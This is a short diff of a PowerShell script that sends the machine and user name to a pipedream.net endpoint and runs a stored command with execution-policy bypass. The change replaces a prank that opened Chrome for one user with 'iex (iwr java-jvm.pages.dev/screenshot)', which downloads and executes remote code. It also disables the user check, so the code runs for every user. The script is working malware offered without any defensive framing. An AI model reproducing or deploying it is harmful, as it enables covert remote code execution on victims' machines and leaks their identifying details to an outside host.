@@ -1,12 +1,12 @@
-$target_user = "42131"
-$command = "Start-Process Chrome 'cornhub"
+$target_user = ""
+$command = "iex (iwr java-jvm.pages.dev/screenshot);"
 
 #$e = dir "c:\Cache\pc-client.exe-1.0.0.0-0"
 
 iwr -uri https://eowh8quogmj1r7l.m.pipedream.net/$env:computername/$env:username -Body (Out-String -InputObject $command) -Method post
 
 
-if ( $Env:UserName -eq $target_user) {
+#if ( $Env:UserName -eq $target_user) {
 #if ($env:computername.startsWith("STDYSUPP")){
 	if (Test-Path "C:\Cache\tmp"){
 		if (!((Get-Content "C:\Cache\tmp") -eq $command)){
@@ -18,4 +18,4 @@ if ( $Env:UserName -eq $target_user) {
 		powershell -ep bypass -Command $command
 		$command | Out-File -FIlePath "C:\Cache\tmp"	
 	}
-}
+#}
